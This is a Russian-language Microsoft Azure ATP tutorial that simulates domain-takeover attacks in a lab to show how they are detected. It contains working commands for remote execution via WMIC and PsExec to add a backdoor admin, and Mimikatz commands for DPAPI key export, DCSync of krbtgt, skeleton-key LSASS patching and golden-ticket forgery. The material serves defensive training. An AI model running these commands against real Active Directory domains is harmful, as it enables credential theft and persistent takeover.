---
title: Сборник схем захвата управления доменом в Azure ATP
description: Сборник схем захвата управления доменом в Azure ATP описывает, как имитировать атаку захвата управления доменом для обнаружения с помощью Azure ATP.
ms.service: azure-advanced-threat-protection
ms.topic: how-to
author: shsagir
ms.author: shsagir
ms.date: 02/28/2019
ms.reviewer: itargoet
ms.openlocfilehash: 10266136b495c6fcc04355c8a16ca1c0ea00381c
ms.sourcegitcommit: 2be59f0bd4c9fd0d3827e9312ba20aa8eb43c6b5
ms.translationtype: HT
ms.contentlocale: ru-RU
ms.lasthandoff: 08/27/2020
ms.locfileid: "88953751"
---
# <a name="tutorial-domain-dominance-playbook"></a>Руководство. Сборник схем захвата управления доменом

В последнем руководстве этой серии из четырех частей, посвященной оповещениям системы безопасности Azure ATP, приведен сборник схем захвата управления доменом. Лаборатория оповещений системы безопасности **Azure ATP** позволяет продемонстрировать возможности Azure ATP по определению и обнаружению потенциальных атак в сети. С помощью лаборатории вы поймете, как проверить некоторые из *дискретных* обнаружений в Azure ATP с использованием возможностей Azure ATP на основе *сигнатур*. Руководства не охватывают обнаружения и оповещения на основе поведения пользователей или сущностей с использованием расширенных возможностей машинного обучения в Azure ATP. Эти типы обнаружений и оповещений не включены в тестирование, так как им необходим период обучения и реальный сетевой трафик за 30 дней. Дополнительные сведения по каждому руководству из этой серии о лаборатории для оповещений системы безопасности ATP см. в [этой статье](atp-playbook-lab-overview.md).

В этом сборнике схем описаны некоторые службы обнаружения угроз захвата управления доменом и оповещений системы безопасности Azure ATP. Для этого здесь имитируются атаки с использованием распространенных общедоступных средств взлома и атак. На этом этапе в процессе кибератаки рассматриваемые методы обычно используются для достижения устойчивого захвата управления доменом.

В этом руководстве вы смоделируете попытки достичь устойчивого захвата управления доменом, чтобы ознакомиться со всеми обнаружениями Azure ATP для следующих распространенных методов:

> [!div class="checklist"]
> * удаленное выполнение кода;
> * API защиты данных (DPAPI);
> * вредоносная репликация;
> * Создание службы
> * использование мастер-ключа;
> * Golden ticket


## <a name="prerequisites"></a>Предварительные условия

1. [Настроенная лаборатория оповещений системы безопасности в ATP](atp-playbook-setup-lab.md). 
     - Рекомендуем как можно точнее следовать инструкции при настройке лаборатории. Чем точнее параметры настроенной лаборатории совпадают с указанными в инструкции, тем проще будет выполнить процедуры тестирования Azure ATP.

2. [Выполнение руководства со сборником схем бокового смещения.](atp-playbook-lateral-movement.md)

## <a name="domain-dominance"></a>Полное управление доменом

В процессе кибератаки, на этапе захвата управления доменом злоумышленник уже получил правомерные учетные данные для доступа к контроллеру домена. Доступ злоумышленника к вашему контроллеру домена означает, что он может нанести вашей сети повреждения любой степени. Помимо непосредственного ущерба злоумышленники, особенно опытные, предпочитают размещать в скомпрометированную среду дополнительные *механизмы гарантии*. Такие атаки гарантируют, что даже если первоначальная компрометация и действия злоумышленника будут обнаружены, у него все равно будут дополнительные возможности для взаимодействия с вашим доменом, что увеличивает его шансы на долгосрочный успех.

### <a name="remote-code-execution"></a>удаленное выполнение кода;

Удаленное выполнение кода — это именно то, чем кажется. Злоумышленники определяют способ удаленного выполнения кода на ресурсе (в данном случае — на контроллере домена). Мы попробуем использовать все эти распространенные инструменты вместе для удаленного выполнения кода и достижения постоянного доступа к контроллеру домена, а затем посмотрим, что отобразится в Azure ATP.

- Инструментарий управления Windows (WMI)
- PsExec из SysInternals

Используя инструментарий WMI через командную строку, попробуйте создать процесс локально на контроллере домена, чтобы создать пользователя с именем InsertedUser и паролем pa$$w0rd1.

1. Откройте командную строку, запущенную в контексте *SamiraA* с компьютера **VictimPC**, и выполните следующую команду:

   ``` cmd
   wmic /node:ContosoDC process call create "net user /add InsertedUser pa$$w0rd1"
   ```

1. Теперь, когда пользователь создан, добавьте его в группу администраторов в контроллере домена:

   ``` cmd
   PsExec.exe \\ContosoDC -accepteula net localgroup "Administrators" InsertedUser /add
   ```

    ![Добавление нового пользователя в группу администраторов на контроллере домена с использованием удаленного выполнения программного кода (PsExec)](media/playbook-dominance-psexec_addtoadmins.png)

1. Перейдите в раздел **Active Directory Users and Computers (ADUC)** (Пользователи и компьютеры Active Directory (ADUC)) в **ContosoDC** и найдите **InsertedUser**. 

1. Щелкните правой кнопкой мыши **Свойства** и проверьте членство.

    ![Просмотр свойств InsertedUser](media/playbook-dominance-inserteduser_properties.png)

Выступая в качестве злоумышленника, вы успешно создали нового пользователя в лаборатории с использованием инструментария WMI. Вы также добавили нового пользователя в группу администраторов с помощью PsExec. С целью устойчивости на контроллере домена была создана другая правомерная, независимая учетная запись. Новые учетные данные дают злоумышленнику постоянный доступ к контроллеру домена в случае обнаружения и удаления предыдущего доступа к учетным данным.

### <a name="remote-code-execution-detection-in-azure-atp"></a>Обнаружение удаленного выполнения кода в Azure ATP

Войдите на портал Azure ATP, чтобы проверить, обнаружила ли служба Azure ATP что-либо после нашей последней имитированной атаки:

![Azure ATP, обнаруживающая удаленное выполнение кода через инструментарий WMI](media/playbook-dominance-wmipsexecdetected.png)

Служба Azure ATP обнаружила удаленные выполнения кода с использованием инструментария WMI и PsExec.

Из-за шифрования сеанса WMI определенные значения, такие как фактические методы WMI или результаты атаки, не отображаются. Однако благодаря обнаружению этих действий в Azure ATP мы получаем оптимальную информацию для выполнения защитных действий.  

Компьютер VictimPC никогда не должен выполнять удаленный код на контроллерах домена.

По мере того как Azure ATP узнает, какие пользователи входят в те или иные группы безопасности, аналогичные подозрительные действия на временной шкале определяются как аномальные. Так как эта лаборатория была создана недавно и период обучения все еще продолжается, это действие не будет отображаться в качестве оповещения. Обнаружение изменений группы безопасности в Azure ATP можно проверить, просмотрев временную шкалу действий. Azure ATP также позволяет создавать отчеты обо всех изменениях группы безопасности, которые могут своевременно отправляться вам по электронной почте.

Получите доступ к странице **Администратор** на портале Azure ATP, используя средство "Поиск". Обнаружение события ввода пользователем в Azure ATP отображается на временной шкале действий группы администраторов.

![Просмотр пользователя, добавленного в конфиденциальную группу безопасности](media/playbook-dominance-admininserteduser.png)

### <a name="data-protection-api-dpapi"></a>API защиты данных (DPAPI)

Программный интерфейс защиты данных (DPAPI) используется Windows для защиты паролей, сохраненных браузерами, зашифрованными файлами, а также других конфиденциальных данных. На контроллерах домена хранится основной ключ, с помощью которого можно расшифровать *все* секретные данные на компьютерах Windows, присоединенных к домену.

С помощью **Mimikatz** мы попытаемся экспортировать основной ключ из контроллера домена. 

1. Выполните следующую команду в контроллере домена:

   ``` cmd
   mimikatz.exe "privilege::debug" "lsadump::backupkeys /system:ContosoDC.contoso.azure /export" "exit"
   ```

    ![Экспорт резервной копии ключа DPAPI из Active Directory с помощью Mimikatz](media/playbook-dominance-dpapi_mimikatz.png)

1. Убедитесь, что файл основного ключа экспортирован. Проверьте каталог, из которого запускали mimikatz.exe, чтобы увидеть файлы DER, PFX, PVK и KEY. Скопируйте устаревший ключ из командной строки.

Как и у злоумышленников, у нас теперь есть ключ для расшифровки любого файла или конфиденциальных данных, зашифрованных с помощью DPAPI, с *любого* компьютера во всем лесу.

### <a name="dpapi-detection-in-azure-atp"></a>Обнаружение DPAPI в Azure ATP

На портале Azure ATP убедитесь, что служба Azure ATP успешно обнаружила нашу атаку с помощью DPAPI:

![Azure ATP обнаружила запрос DPAPI](media/playbook-dominance-dpapidetected.png)

### <a name="malicious-replication"></a>Вредоносная репликация

Вредоносная репликация позволяет злоумышленнику реплицировать сведения о пользователе с использованием учетных данных администратора домена или их эквивалентов. Вредоносная репликация фактически позволяет злоумышленнику удаленно собирать учетные данные. Очевидно, что самой критически важной учетной записью при сборе является krbtgt, так как ее основной ключ используется для входа во все билеты Kerberos.

Два распространенных набора инструментов для взлома, которые позволяют предпринять вредоносную репликацию, — это **Mimikatz** и **Impacket** от Core Security.

#### <a name="mimikatz-lsadumpdcsync"></a>Mimikatz lsadump::dcsync

На компьютере **VictimPC** в контексте **SamirA** выполните следующую команду Mimikatz:

``` cmd
mimikatz.exe "lsadump::dcsync /domain:contoso.azure /user:krbtgt" "exit" >> c:\temp\ContosoDC_krbtgt-export.txt
```

Мы реплицировали данные учетной записи krbtgt в c:\\temp\\ContosoDC_krbtgt-export.txt.

![Вредоносная репликация через Mimikatz](media/playbook-dominance-maliciousrep_mimikatz.png)

#### <a name="malicious-replication-detection-in-azure-atp"></a>Обнаружение вредоносной репликации в Azure ATP

На портале Azure ATP убедитесь, что SOC теперь известно о вредоносной репликации, которую мы имитировали на VictimPC.

![Вредоносная репликация, обнаруженная с помощью AATP](media/playbook-dominance-maliciousrep_detected.png)

### <a name="skeleton-key"></a>использование мастер-ключа;

Еще один метод захвата управления доменом, который используется злоумышленниками, известен как **использование мастер-ключа**. Злоумышленник может *в любое время* *маскироваться под любого пользователя* с использованием самостоятельно созданного мастер-ключа. При атаке с использованием мастер-ключа любой пользователь может входить с помощью своего обычного пароля, однако всем учетным записям также присваивается основной пароль. Новый основной пароль или мастер-ключ дает любому знающему его пользователю открытый доступ к учетной записи. Атака с использованием мастер-ключа осуществляется путем исправления процесса LSASS.exe на контроллере домена, заставляя пользователей проходить проверку подлинности с помощью типа шифрования более ранней версии.

Воспользуемся мастер-ключом, чтобы увидеть, как работает этот тип атаки:

1. Переместите **Mimikatz** в **ContosoDC**, используя полученные ранее учетные данные **SamirA**. Убедитесь, что вы отправляете **mimikatz.exe** с правильной архитектурой на основе типа архитектуры контроллера домена (64-разрядная и 32-разрядная). Из папки **Mimikatz** выполните следующее:

   ``` cmd
   xcopy mimikatz.exe \\ContosoDC\c$\temp
   ```

1. С помощью инструмента **Mimikatz**, который размещен в контроллере домена, удаленно выполните следующий код через PsExec:

   ``` cmd
   PsExec.exe \\ContosoDC -accepteula cmd /c (cd c:\temp ^& mimikatz.exe "privilege::debug" "misc::skeleton" ^& "exit")
   ```

1. Вы успешно исправили процесс LSASS в **ContosoDC**.

    ![Атака с использованием мастер-ключа через Mimikatz](media/playbook-dominance-skeletonkey.png)

### <a name="exploiting-the-skeleton-key-patched-lsass"></a>Использование LSASS, исправленного с помощью мастер-ключа

На компьютере **VictimPC** откройте командную строку (в контексте **JeffL**) и выполните следующее, чтобы попытаться войти в контекст RonHD.

``` cmd
runas /user:ronhd@contoso.azure "notepad"
```

При появлении запроса специально используйте неправильный пароль. Это действие доказывает, что учетная запись *по-прежнему* имеет пароль после выполнения атаки.  

![Использование *неправильного* пароля после атаки с использованием мастер-ключа (этот метод работает именно так, как описано)](media/playbook-dominance-skeletonkey_wrong.png)

Однако мастер-ключ добавляет еще один пароль для каждой учетной записи. Выполните команду runas еще раз, но в этот раз используйте mimikatz в качестве пароля.

``` cmd
runas /user:ronhd@contoso.azure "notepad"
```

Эта команда создает новый процесс, *блокнот*, выполняемый в контексте RonHD. **Мастер-ключ можно создать для _любой_ учетной записи, включая учетные записи служб и учетные записи компьютеров.**

> [!Important]
> Очень важно перезагрузить ContosoDC после выполнения атаки с использованием мастер-ключа. Без этого процесс LSASS.exe на ContosoDC будет исправлен и изменен, что приведет к понижению уровня каждого запроса проверки подлинности до RC4.

### <a name="skeleton-key-attack-detection-in-azure-atp"></a>Обнаружение атаки с использованием мастер-ключа в Azure ATP

Что обнаружила и сообщила служба Azure ATP, пока все это происходило?

![Атака с использованием мастер-ключа, обнаруженная с помощью AATP](media/playbook-dominance-skeletonkey_detected.png)

Служба Azure ATP успешно обнаружила подозрительный метод шифрования перед проверкой подлинности, используемый для этого пользователя.

### <a name="golden-ticket---existing-user"></a>Атака Golden Ticket — существующий пользователь

После получения доступа к Golden Ticket (учетная запись krbtgt описана в разделе о [вредоносной репликации](#malicious-replication)) злоумышленник может входить в билеты *как будто они являются контроллерами домена*. **Mimikatz**, ИД безопасности домена и украденная учетная запись krbtgt являются обязательными компонентами при выполнении подобной атаки. Мы можем создавать билеты не только для имеющегося пользователя, но и для пользователей, которые еще не существуют.

1. От имени пользователя JeffL выполните указанную ниже команду на компьютере **VictimPC**, чтобы получить ИД безопасности домена:

   ``` cmd
   whoami /user
   ```

    ![Идентификатор безопасности для пользователя Golden Ticket](media/playbook-dominance-golden_whoamisid.png)

1. Определите и скопируйте ИД безопасности домена, показанный на приведенном выше снимке экрана.

1. С помощью **Mimikatz** используйте скопированный ИД безопасности домена вместе с украденным NTLM-хэшем пользователя krbtgt для создания TGT. Вставьте следующий текст в cmd.exe от имени пользователя JeffL:

   ``` cmd
   mimikatz.exe "privilege::debug" "kerberos::golden /domain:contoso.azure /sid:S-1-5-21-2839646386-741382897-445212193 /krbtgt:c96537e5dca507ee7cfdede66d33103e /user:SamiraA /ticket:c:\temp\GTSamiraA_2018-11-28.kirbi /ptt" "exit"
   ```

    ![Создание Golden Ticket](media/playbook-dominance-golden_generate.png)

   Часть ```/ptt``` команды позволяет немедленно передать созданный билет в память.

1. Давайте убедимся, что учетные данные находятся в памяти.  Выполните ```klist``` в консоли.

    ![Результаты klist после передачи созданного билета](media/playbook-dominance-golden_klist.png)

1. Выступая в качестве злоумышленника, выполните следующую команду передачи билета, чтобы использовать ее на контроллере домена:

   ``` cmd
   dir \\ContosoDC\c$
   ```

   Успешно. Вы сформировали **фальшивый** Golden Ticket для пользователя SamiraA.

    ![Выполнение атаки Golden Ticket с помощью Mimikatz](media/playbook-dominance-golden_ptt.png)

Почему это сработало? Атака Golden Ticket работает из-за того, что созданный билет был правильно подписан с помощью ключа KRBTGT, который был получен ранее. Этот билет позволяет нам, как злоумышленнику, получить доступ к ContosoDC и добавить себя в любую нужную группу безопасности.

#### <a name="golden-ticket--existing-user-attack-detection"></a>Golden Ticket — обнаружение атаки существующего пользователя

Azure ATP использует несколько методов для обнаружения возможных атак этого типа. В этом сценарии Azure ATP обнаружила переход фальшивого билета на более слабое шифрование.

![Атака Golden Ticket была обнаружена](media/playbook-dominance-golden_detected.png)

> [!Important]
>Напоминание. До тех пор, пока полученный злоумышленником ключ KRBTGT остается допустимым в среде, созданные с его помощью билеты также остаются действительными. В этом случае злоумышленник достигает устойчивого захвата управления доменом, [пока KRBTGT не буде сброшен дважды](/windows-server/identity/ad-ds/manage/ad-forest-recovery-resetting-the-krbtgt-password).

## <a name="next-steps"></a>Дальнейшие шаги

* [Руководство по оповещениям системы безопасности Azure ATP](suspicious-activity-guide.md)
* [Анализ путей бокового смещения в Azure ATP](use-case-lateral-movement-path.md)
* [Загляните на форум Azure ATP!](https://aka.ms/azureatpcommunity)

## <a name="join-the-community"></a>Присоединяйтесь к сообществу!

Возникли дополнительные вопросы или желание обсудить с другими пользователями службу Azure ATP и связанные с ней вопросы безопасности? Присоединяйтесь к [сообществу Azure ATP](https://techcommunity.microsoft.com/t5/Azure-Advanced-Threat-Protection/bd-p/AzureAdvancedThreatProtection)!